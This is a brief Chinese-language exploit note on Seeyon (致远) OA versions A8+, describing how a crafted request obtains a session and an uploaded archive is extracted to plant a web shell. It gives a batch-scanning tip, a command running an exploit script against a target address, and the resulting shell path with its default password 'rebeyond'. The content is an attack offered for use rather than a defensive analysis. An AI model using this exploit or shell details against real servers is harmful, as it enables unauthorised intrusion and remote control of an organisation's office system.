## 漏洞概述

致远OA通过发送特殊请求获取session，通过文件上传接口上传压缩包解压后可Getshell

## 影响范围

```http
A8+
```

## POC

大宝剑可批量扫描此漏洞，有误报性，配合EXP验证

## EXP

```bash
#脚本在此目录下
python session-rce.py http://192.168.1.100
```

```http
Shell地址：/seeyon/common/designer/pageLayout/a234.jspx
默认密码:rebeyond
```